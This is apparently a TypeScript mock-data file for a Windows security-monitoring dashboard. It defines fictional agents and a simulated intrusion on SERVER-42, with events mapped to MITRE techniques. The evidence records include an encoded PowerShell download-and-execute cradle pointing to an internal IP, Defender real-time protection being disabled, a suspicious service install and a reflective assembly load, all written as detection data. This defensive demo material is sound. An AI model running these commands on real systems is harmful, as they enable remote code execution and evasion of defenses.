import {
  Agent,
  EventRecord,
  EvidenceItem,
  Investigation,
  Detection,
  CollectionProfile,
  SyslogSource,
  SyslogListener,
  SyslogMessage,
  Integration,
  AuditRecord,
  SystemHealthComponent
} from '../types';

// Real Windows telemetry & SOC dataset

export const MOCK_AGENTS: Agent[] = [
  {
    id: 'agent-042',
    hostname: 'SERVER-42',
    ip: '10.20.4.42',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-investigation',
    profileName: 'Incident Response / Investigation',
    status: 'Healthy',
    eventsPerSec: 87,
    queueSize: '18 MB',
    queueBytes: 18874368,
    version: '0.1.0',
    lastSeen: '4 sec ago',
    lastSeenSecondsAgo: 4,
    site: 'US-East-DC1',
    cpuPercent: 14.2,
    memoryPercent: 38.6,
    diskPercent: 52.1,
    uptime: '42d 18h 12m',
    delivery: {
      collected: 4832911,
      transmitted: 4832911,
      acknowledged: 4832911,
      retries: 21,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: true,
    enrolledAt: '2026-06-12 08:30:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-dc01',
    hostname: 'DC-01',
    ip: '10.20.1.10',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-dc',
    profileName: 'Domain Controller',
    status: 'Warning',
    eventsPerSec: 128,
    queueSize: '1.2 GB',
    queueBytes: 1288490188,
    version: '0.1.0',
    lastSeen: '21 sec ago',
    lastSeenSecondsAgo: 21,
    site: 'US-East-DC1',
    cpuPercent: 31.8,
    memoryPercent: 62.4,
    diskPercent: 78.9,
    uptime: '118d 04h 50m',
    delivery: {
      collected: 18420912,
      transmitted: 18210400,
      acknowledged: 18210400,
      retries: 412,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-01-15 11:00:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-dc02',
    hostname: 'DC-02',
    ip: '10.20.1.11',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-dc',
    profileName: 'Domain Controller',
    status: 'Healthy',
    eventsPerSec: 114,
    queueSize: '12 MB',
    queueBytes: 12582912,
    version: '0.1.0',
    lastSeen: '6 sec ago',
    lastSeenSecondsAgo: 6,
    site: 'US-West-DC2',
    cpuPercent: 18.5,
    memoryPercent: 44.1,
    diskPercent: 61.2,
    uptime: '92d 16h 04m',
    delivery: {
      collected: 14289100,
      transmitted: 14289100,
      acknowledged: 14289100,
      retries: 14,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-01-15 11:15:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-srv01',
    hostname: 'SERVER-01',
    ip: '10.20.4.11',
    os: 'Windows Server 2019 Standard (Build 17763.4974)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Healthy',
    eventsPerSec: 42,
    queueSize: '0 MB',
    queueBytes: 0,
    version: '0.1.0',
    lastSeen: '8 sec ago',
    lastSeenSecondsAgo: 8,
    site: 'US-East-DC1',
    cpuPercent: 8.4,
    memoryPercent: 24.1,
    diskPercent: 41.0,
    uptime: '67d 02h 19m',
    delivery: {
      collected: 3102450,
      transmitted: 3102450,
      acknowledged: 3102450,
      retries: 2,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-03-20 14:00:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-srv02',
    hostname: 'SERVER-02',
    ip: '10.20.4.12',
    os: 'Windows Server 2019 Standard (Build 17763.4974)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Healthy',
    eventsPerSec: 31,
    queueSize: '0 MB',
    queueBytes: 0,
    version: '0.1.0',
    lastSeen: '11 sec ago',
    lastSeenSecondsAgo: 11,
    site: 'US-East-DC1',
    cpuPercent: 6.1,
    memoryPercent: 22.8,
    diskPercent: 39.4,
    uptime: '67d 02h 11m',
    delivery: {
      collected: 2490100,
      transmitted: 2490100,
      acknowledged: 2490100,
      retries: 1,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-03-20 14:10:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-app17',
    hostname: 'APP-17',
    ip: '10.20.8.17',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-ps',
    profileName: 'PowerShell Investigation',
    status: 'Healthy',
    eventsPerSec: 64,
    queueSize: '4 MB',
    queueBytes: 4194304,
    version: '0.1.0',
    lastSeen: '3 sec ago',
    lastSeenSecondsAgo: 3,
    site: 'EU-Frankfurt-DC3',
    cpuPercent: 19.1,
    memoryPercent: 49.3,
    diskPercent: 66.8,
    uptime: '28d 11h 45m',
    delivery: {
      collected: 4109840,
      transmitted: 4109840,
      acknowledged: 4109840,
      retries: 8,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-05-10 09:40:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-scada01',
    hostname: 'OT-HMI-01',
    ip: '10.30.2.14',
    os: 'Windows 10 Enterprise LTSC (Build 19044.3086)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Warning',
    eventsPerSec: 16,
    queueSize: '480 MB',
    queueBytes: 503316480,
    version: '0.1.0',
    lastSeen: '45 sec ago',
    lastSeenSecondsAgo: 45,
    site: 'Plant-Substation-North',
    cpuPercent: 22.0,
    memoryPercent: 71.0,
    diskPercent: 82.5,
    uptime: '210d 09h 14m',
    delivery: {
      collected: 1209300,
      transmitted: 1109000,
      acknowledged: 1109000,
      retries: 89,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2025-11-04 16:20:00 UTC',
    domain: 'OT-ISOLATED.LOCAL',
  },
  {
    id: 'agent-ex01',
    hostname: 'EXCH-01',
    ip: '10.20.5.20',
    os: 'Windows Server 2019 Datacenter (Build 17763.4974)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Offline',
    eventsPerSec: 0,
    queueSize: '1.4 GB',
    queueBytes: 1503238553,
    version: '0.0.9',
    lastSeen: '18 min ago',
    lastSeenSecondsAgo: 1080,
    site: 'US-East-DC1',
    cpuPercent: 0,
    memoryPercent: 0,
    diskPercent: 88.0,
    uptime: '0m',
    delivery: {
      collected: 9812400,
      transmitted: 9801000,
      acknowledged: 9801000,
      retries: 540,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-02-01 10:00:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-sql03',
    hostname: 'SQL-PROD-03',
    ip: '10.20.6.33',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Offline',
    eventsPerSec: 0,
    queueSize: '890 MB',
    queueBytes: 933232640,
    version: '0.1.0',
    lastSeen: '34 min ago',
    lastSeenSecondsAgo: 2040,
    site: 'US-West-DC2',
    cpuPercent: 0,
    memoryPercent: 0,
    diskPercent: 74.0,
    uptime: '0m',
    delivery: {
      collected: 11200400,
      transmitted: 11190000,
      acknowledged: 11190000,
      retries: 310,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-02-14 15:20:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-bastion01',
    hostname: 'BASTION-JUMP-01',
    ip: '10.20.0.5',
    os: 'Windows Server 2022 Standard (Build 20348.1607)',
    profileId: 'profile-rdp',
    profileName: 'RDP Investigation',
    status: 'Healthy',
    eventsPerSec: 54,
    queueSize: '2 MB',
    queueBytes: 2097152,
    version: '0.1.0',
    lastSeen: '2 sec ago',
    lastSeenSecondsAgo: 2,
    site: 'US-East-DC1',
    cpuPercent: 11.2,
    memoryPercent: 32.4,
    diskPercent: 44.0,
    uptime: '54d 19h 08m',
    delivery: {
      collected: 5120000,
      transmitted: 5120000,
      acknowledged: 5120000,
      retries: 4,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-03-01 07:45:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-file02',
    hostname: 'FS-STORAGE-02',
    ip: '10.20.7.22',
    os: 'Windows Server 2019 Standard (Build 17763.4974)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Healthy',
    eventsPerSec: 28,
    queueSize: '0 MB',
    queueBytes: 0,
    version: '0.1.0',
    lastSeen: '14 sec ago',
    lastSeenSecondsAgo: 14,
    site: 'US-East-DC1',
    cpuPercent: 9.3,
    memoryPercent: 27.5,
    diskPercent: 81.2,
    uptime: '104d 12h 00m',
    delivery: {
      collected: 2901400,
      transmitted: 2901400,
      acknowledged: 2901400,
      retries: 3,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: false,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-02-18 10:00:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-ws88',
    hostname: 'WS-ENG-88',
    ip: '10.20.50.88',
    os: 'Windows 11 Enterprise (Build 22631.3007)',
    profileId: 'profile-baseline',
    profileName: 'Windows Server Baseline',
    status: 'Healthy',
    eventsPerSec: 19,
    queueSize: '0 MB',
    queueBytes: 0,
    version: '0.1.0',
    lastSeen: '9 sec ago',
    lastSeenSecondsAgo: 9,
    site: 'HQ-Campus-Bld2',
    cpuPercent: 12.7,
    memoryPercent: 41.2,
    diskPercent: 55.4,
    uptime: '14d 06h 22m',
    delivery: {
      collected: 890400,
      transmitted: 890400,
      acknowledged: 890400,
      retries: 0,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-06-01 13:00:00 UTC',
    domain: 'CORP.INTERNAL',
  },
  {
    id: 'agent-kdc01',
    hostname: 'KDC-BACKUP-01',
    ip: '10.20.1.15',
    os: 'Windows Server 2022 Datacenter (Build 20348.1607)',
    profileId: 'profile-dc',
    profileName: 'Domain Controller',
    status: 'Warning',
    eventsPerSec: 92,
    queueSize: '340 MB',
    queueBytes: 356515840,
    version: '0.1.0',
    lastSeen: '19 sec ago',
    lastSeenSecondsAgo: 19,
    site: 'EU-Frankfurt-DC3',
    cpuPercent: 28.4,
    memoryPercent: 58.9,
    diskPercent: 67.2,
    uptime: '75d 20h 14m',
    delivery: {
      collected: 7654000,
      transmitted: 7580000,
      acknowledged: 7580000,
      retries: 180,
      dropped: 0,
    },
    collection: {
      security: true,
      system: true,
      application: true,
      powershell: true,
      defender: true,
    },
    investigationMode: false,
    enrolledAt: '2026-03-12 11:30:00 UTC',
    domain: 'CORP.INTERNAL',
  },
];

// Generate remainder of total 184 agents with deterministic mock distribution
(() => {
  const existingCount = MOCK_AGENTS.length;
  const targetTotal = 184;
  const sites = ['US-East-DC1', 'US-West-DC2', 'EU-Frankfurt-DC3', 'Plant-Substation-North', 'APAC-Tokyo-DC4'];
  const osList = [
    'Windows Server 2022 Datacenter (Build 20348.1607)',
    'Windows Server 2019 Standard (Build 17763.4974)',
    'Windows 11 Enterprise (Build 22631.3007)',
    'Windows 10 Enterprise LTSC (Build 19044.3086)',
  ];

  for (let i = existingCount + 1; i <= targetTotal; i++) {
    const pad = String(i).padStart(3, '0');
    const hostname = `NODE-${pad}`;
    const ip = `10.20.${Math.floor(i / 20) + 10}.${(i % 200) + 1}`;
    const site = sites[i % sites.length];
    const os = osList[i % osList.length];
    const eventsPerSec = 15 + ((i * 7) % 45);

    MOCK_AGENTS.push({
      id: `agent-gen-${pad}`,
      hostname,
      ip,
      os,
      profileId: 'profile-baseline',
      profileName: 'Windows Server Baseline',
      status: 'Healthy',
      eventsPerSec,
      queueSize: '0 MB',
      queueBytes: 0,
      version: '0.1.0',
      lastSeen: `${(i % 15) + 1} sec ago`,
      lastSeenSecondsAgo: (i % 15) + 1,
      site,
      cpuPercent: 5 + (i % 20),
      memoryPercent: 20 + (i % 35),
      diskPercent: 30 + (i % 40),
      uptime: `${30 + (i % 90)}d ${(i % 24)}h`,
      delivery: {
        collected: 1000000 + i * 15200,
        transmitted: 1000000 + i * 15200,
        acknowledged: 1000000 + i * 15200,
        retries: i % 5,
        dropped: 0,
      },
      collection: {
        security: true,
        system: true,
        application: true,
        powershell: i % 3 === 0,
        defender: true,
      },
      investigationMode: false,
      enrolledAt: '2026-04-10 00:00:00 UTC',
      domain: 'CORP.INTERNAL',
    });
  }
})();

// Detailed Evidence Items
export const MOCK_EVIDENCE: EvidenceItem[] = [
  {
    id: 'EVID-001',
    eventRecordId: 'evt-4624-rdp',
    eventId: 4624,
    title: 'An account was successfully logged on (Logon Type 10 / RDP)',
    category: 'Authentication',
    host: 'SERVER-42',
    timestamp: '2026-09-02 10:41:03 UTC',
    summary: 'RDP Interactive logon for CORP\\admin from external pivot workstation 192.168.40.88',
    details: {
      'Subject User': 'CORP\\admin',
      'Logon Type': '10 (RemoteInteractive / RDP)',
      'Source Network Address': '192.168.40.88',
      'Target Domain': 'CORP',
      'Process Name': 'C:\\Windows\\System32\\winlogon.exe',
      'Authentication Package': 'Negotiate / NTLM V2',
    },
    relatedEvidenceIds: ['EVID-002', 'EVID-003'],
    severity: 'Medium',
  },
  {
    id: 'EVID-002',
    eventRecordId: 'evt-4672-priv',
    eventId: 4672,
    title: 'Special privileges assigned to new logon',
    category: 'Privileged Access',
    host: 'SERVER-42',
    timestamp: '2026-09-02 10:41:07 UTC',
    summary: 'SeDebugPrivilege and SeTcbPrivilege elevated rights granted to session 0x3e7',
    details: {
      'Subject User': 'CORP\\admin',
      'Assigned Privileges': 'SeDebugPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege',
      'Logon ID': '0x3E7A912',
    },
    relatedEvidenceIds: ['EVID-001', 'EVID-003'],
    severity: 'High',
  },
  {
    id: 'EVID-003',
    eventRecordId: 'evt-4688-ps',
    eventId: 4688,
    title: 'A new process has been created (PowerShell Execution)',
    category: 'Process Creation',
    host: 'SERVER-42',
    timestamp: '2026-09-02 10:42:11 UTC',
    summary: 'Encoded PowerShell command executed from C:\\Users\\Public with hidden window',
    details: {
      'Process Name': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'Process Command Line': 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMgAuADEAMwA6ADgAMAA4ADAvAHMAJwApAA==',
      'Decoded Script': 'IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.2.13:8080/s\')',
      'Parent Process Name': 'C:\\Windows\\System32\\cmd.exe',
      'Parent Process ID': 4892,
      'Creator User': 'CORP\\admin',
    },
    relatedEvidenceIds: ['EVID-002', 'EVID-004'],
    severity: 'High',
  },
  {
    id: 'EVID-004',
    eventRecordId: 'evt-7045-svc',
    eventId: 7045,
    title: 'A new service was installed in the system',
    category: 'Service Installation',
    host: 'SERVER-42',
    timestamp: '2026-09-02 10:42:17 UTC',
    summary: 'Service "UpdaterSvc" installed with image path pointing to C:\\Users\\Public\\updater.exe',
    details: {
      'Service Name': 'UpdaterSvc',
      'Service File Name': 'C:\\Users\\Public\\updater.exe',
      'Service Type': '0x10 (Win32 Own Process)',
      'Service Start Type': '2 (Auto Start)',
      'Service Account': 'LocalSystem',
      'Installed By': 'CORP\\admin',
    },
    relatedEvidenceIds: ['EVID-003', 'EVID-005'],
    severity: 'Critical',
  },
  {
    id: 'EVID-005',
    eventRecordId: 'evt-5007-def',
    eventId: 5007,
    title: 'Microsoft Defender Antivirus Configuration Changed',
    category: 'Defense Evasion',
    host: 'SERVER-42',
    timestamp: '2026-09-02 10:42:23 UTC',
    summary: 'Defender real-time monitoring and folder exclusions altered for C:\\Users\\Public',
    details: {
      'Old Configuration': 'DisableRealtimeMonitoring=0, ExclusionPath=""',
      'New Configuration': 'DisableRealtimeMonitoring=1, ExclusionPath="C:\\Users\\Public"',
      'User': 'NT AUTHORITY\\SYSTEM',
      'Process ID': 6120,
    },
    relatedEvidenceIds: ['EVID-004'],
    severity: 'Critical',
  },
];

// Rich Event Records for Event Explorer & Details
export const MOCK_EVENTS: EventRecord[] = [
  {
    id: 'evt-7045-svc',
    timestamp: '2026-09-02 10:42:17 UTC',
    severity: 'Critical',
    host: 'SERVER-42',
    channel: 'System',
    channelFull: 'System',
    eventId: 7045,
    provider: 'Service Control Manager',
    user: 'CORP\\admin',
    sourceIp: '192.168.40.88',
    summary: 'A new service was installed: UpdaterSvc (C:\\Users\\Public\\updater.exe)',
    details: {
      'ServiceName': 'UpdaterSvc',
      'ImagePath': 'C:\\Users\\Public\\updater.exe',
      'ServiceType': 'user mode service',
      'StartType': 'auto start',
      'AccountName': 'LocalSystem',
      'CallerUser': 'CORP\\admin',
      'CallerProcessId': '6120',
    },
    riskIndicators: [
      'Executable located in user-writable directory (C:\\Users\\Public)',
      'Executable has no trusted publisher signature (Self-signed / Untrusted)',
      'Service created shortly after privileged RDP session from pivot IP',
      'Service configured to run with highest LocalSystem token',
    ],
    relatedEventIds: ['evt-4624-rdp', 'evt-4672-priv', 'evt-4688-ps', 'evt-5007-def'],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931b2012f4}" EventSourceName="Service Control Manager"/>
    <EventID Qualifiers="16384">7045</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8080000000000000</Keywords>
    <TimeCreated SystemTime="2026-09-02T10:42:17.4128912Z"/>
    <EventRecordID>489201</EventRecordID>
    <Correlation ActivityID="{a8b9c1d2-3e4f-5a6b-7c8d-9e0f1a2b3c4d}"/>
    <Execution ProcessID="788" ThreadID="1024"/>
    <Channel>System</Channel>
    <Computer>SERVER-42.corp.internal</Computer>
    <Security UserID="S-1-5-21-3948201948-284910293-10294819-500"/>
  </System>
  <EventData>
    <Data Name="ServiceName">UpdaterSvc</Data>
    <Data Name="ImagePath">C:\\Users\\Public\\updater.exe</Data>
    <Data Name="ServiceType">user mode service</Data>
    <Data Name="StartType">auto start</Data>
    <Data Name="AccountName">LocalSystem</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 7045,
      channel: "System",
      computer: "SERVER-42.corp.internal",
      serviceName: "UpdaterSvc",
      imagePath: "C:\\Users\\Public\\updater.exe",
      startType: "auto start",
      accountName: "LocalSystem",
      userSid: "S-1-5-21-3948201948-284910293-10294819-500",
      user: "CORP\\admin"
    }, null, 2),
    mitreAttack: {
      tactic: 'Persistence',
      technique: 'Create or Modify System Process: Windows Service',
      id: 'T1543.003'
    }
  },
  {
    id: 'evt-5007-def',
    timestamp: '2026-09-02 10:42:23 UTC',
    severity: 'Critical',
    host: 'SERVER-42',
    channel: 'Defender',
    channelFull: 'Microsoft-Windows-Windows Defender/Operational',
    eventId: 5007,
    provider: 'Microsoft-Windows-Windows Defender',
    user: 'NT AUTHORITY\\SYSTEM',
    sourceIp: '10.20.4.42',
    summary: 'Microsoft Defender Antivirus Configuration Changed: Real-Time Protection Disabled',
    details: {
      'OldValue': 'DisableRealtimeMonitoring = 0',
      'NewValue': 'DisableRealtimeMonitoring = 1',
      'ExclusionPath': 'C:\\Users\\Public',
      'ProcessName': 'C:\\Users\\Public\\updater.exe',
      'ProcessID': '6120',
    },
    riskIndicators: [
      'Endpoint security engine disabled programmatically',
      'Folder exclusion registered for known drop folder',
    ],
    relatedEventIds: ['evt-7045-svc', 'evt-4688-ps'],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4bc3-b3f2-538b7ee45179}"/>
    <EventID>5007</EventID>
    <TimeCreated SystemTime="2026-09-02T10:42:23.1190281Z"/>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>SERVER-42.corp.internal</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="Old Value">DisableRealtimeMonitoring=0</Data>
    <Data Name="New Value">DisableRealtimeMonitoring=1;ExclusionPath=C:\\Users\\Public</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 5007,
      channel: "Microsoft-Windows-Windows Defender/Operational",
      computer: "SERVER-42.corp.internal",
      action: "DisableRealtimeMonitoring=1",
      pathExclusion: "C:\\Users\\Public"
    }, null, 2),
    mitreAttack: {
      tactic: 'Defense Evasion',
      technique: 'Impair Defenses: Disable or Modify Tools',
      id: 'T1562.001'
    }
  },
  {
    id: 'evt-4688-ps',
    timestamp: '2026-09-02 10:42:11 UTC',
    severity: 'High',
    host: 'SERVER-42',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4688,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\admin',
    sourceIp: '192.168.40.88',
    summary: 'A new process has been created: powershell.exe with Base64 encoded payload',
    details: {
      'NewProcessName': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'CommandLine': 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMgAuADEAMwA6ADgAMAA4ADAvAHMAJwApAA==',
      'DecodedCommand': 'IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.2.13:8080/s\')',
      'ParentProcessName': 'C:\\Windows\\System32\\cmd.exe',
      'ParentProcessId': '4892',
      'TokenElevationType': 'TokenElevationTypeFull (2)',
    },
    riskIndicators: [
      'PowerShell launched with -EncodedCommand and Hidden Window flag',
      'In-memory code execution pattern (IEX / WebClient cradle)',
      'Untrusted internal IP address referenced (10.10.2.13)',
    ],
    relatedEventIds: ['evt-4624-rdp', 'evt-4672-priv', 'evt-7045-svc'],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"/>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-09-02T10:42:11.8901234Z"/>
    <Channel>Security</Channel>
    <Computer>SERVER-42.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFg...</Data>
    <Data Name="SubjectUserName">admin</Data>
    <Data Name="SubjectDomainName">CORP</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4688,
      process: "powershell.exe",
      parent: "cmd.exe",
      flags: ["-NoP", "-NonI", "-W Hidden", "-Enc"],
      user: "CORP\\admin"
    }, null, 2),
    mitreAttack: {
      tactic: 'Execution',
      technique: 'Command and Scripting Interpreter: PowerShell',
      id: 'T1059.001'
    }
  },
  {
    id: 'evt-4672-priv',
    timestamp: '2026-09-02 10:41:07 UTC',
    severity: 'High',
    host: 'SERVER-42',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4672,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\admin',
    sourceIp: '192.168.40.88',
    summary: 'Special privileges assigned to new logon: SeDebugPrivilege, SeTcbPrivilege',
    details: {
      'SubjectUserName': 'admin',
      'SubjectDomainName': 'CORP',
      'SubjectUserSid': 'S-1-5-21-3948201948-284910293-10294819-500',
      'PrivilegeList': 'SeSecurityPrivilege\nSeBackupPrivilege\nSeRestorePrivilege\nSeTakeOwnershipPrivilege\nSeDebugPrivilege\nSeSystemEnvironmentPrivilege\nSeLoadDriverPrivilege\nSeImpersonatePrivilege\nSeEnableDelegationPrivilege',
    },
    riskIndicators: [
      'High privilege token assignment immediately following RDP logon',
    ],
    relatedEventIds: ['evt-4624-rdp', 'evt-4688-ps'],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4672</EventID>
    <TimeCreated SystemTime="2026-09-02T10:41:07.1230000Z"/>
    <Channel>Security</Channel>
    <Computer>SERVER-42.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">admin</Data>
    <Data Name="PrivilegeList">SeDebugPrivilege, SeTcbPrivilege</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4672,
      user: "CORP\\admin",
      privileges: ["SeDebugPrivilege", "SeTcbPrivilege", "SeImpersonatePrivilege"]
    }, null, 2),
    mitreAttack: {
      tactic: 'Privilege Escalation',
      technique: 'Valid Accounts: Domain Accounts',
      id: 'T1078.002'
    }
  },
  {
    id: 'evt-4624-rdp',
    timestamp: '2026-09-02 10:41:03 UTC',
    severity: 'Medium',
    host: 'SERVER-42',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4624,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\admin',
    sourceIp: '192.168.40.88',
    summary: 'An account was successfully logged on (Logon Type 10 / RemoteInteractive RDP)',
    details: {
      'TargetUserName': 'admin',
      'TargetDomainName': 'CORP',
      'LogonType': '10',
      'IpAddress': '192.168.40.88',
      'IpPort': '52418',
      'WorkstationName': 'WORKSTATION-SEC',
      'LogonProcessName': 'User32',
      'AuthenticationPackageName': 'Negotiate',
    },
    riskIndicators: [
      'Interactive logon outside normal business maintenance window',
      'Source address is a non-standard subnet segment',
    ],
    relatedEventIds: ['evt-4672-priv', 'evt-4688-ps'],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2026-09-02T10:41:03.0000000Z"/>
    <Channel>Security</Channel>
    <Computer>SERVER-42.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">admin</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">192.168.40.88</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4624,
      user: "CORP\\admin",
      logonType: 10,
      sourceIp: "192.168.40.88"
    }, null, 2),
    mitreAttack: {
      tactic: 'Initial Access',
      technique: 'Remote Services: Remote Desktop Protocol',
      id: 'T1021.001'
    }
  },
  {
    id: 'evt-4720-user',
    timestamp: '2026-09-02 10:35:12 UTC',
    severity: 'High',
    host: 'DC-02',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4720,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\svc_backup',
    sourceIp: '10.20.1.11',
    summary: 'A user account was created: ghost_admin in Domain Admins container',
    details: {
      'TargetUserName': 'ghost_admin',
      'TargetDomainName': 'CORP',
      'SubjectUserName': 'svc_backup',
      'SubjectDomainName': 'CORP',
      'UserParameters': '-',
      'SamAccountName': 'ghost_admin',
    },
    riskIndicators: [
      'Service account created an interactive domain account',
      'Account created directly under high privilege OU',
    ],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4720</EventID>
    <TimeCreated SystemTime="2026-09-02T10:35:12.0000000Z"/>
    <Channel>Security</Channel>
    <Computer>DC-02.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">ghost_admin</Data>
    <Data Name="SubjectUserName">svc_backup</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4720,
      targetUser: "ghost_admin",
      subjectUser: "CORP\\svc_backup",
      host: "DC-02"
    }, null, 2),
    mitreAttack: {
      tactic: 'Persistence',
      technique: 'Create Account: Local Account',
      id: 'T1136.001'
    }
  },
  {
    id: 'evt-4104-ps',
    timestamp: '2026-09-02 10:28:44 UTC',
    severity: 'Medium',
    host: 'APP-17',
    channel: 'PowerShell',
    channelFull: 'Microsoft-Windows-PowerShell/Operational',
    eventId: 4104,
    provider: 'Microsoft-Windows-PowerShell',
    user: 'CORP\\dev_user',
    sourceIp: '10.20.8.17',
    summary: 'Execute a Remote Command (Script Block Logging) invoking reflection DLL injection',
    details: {
      'ScriptBlockText': '[Reflection.Assembly]::Load([System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgA..."))',
      'ScriptBlockId': 'f5d812-4401-44ab',
      'Path': '',
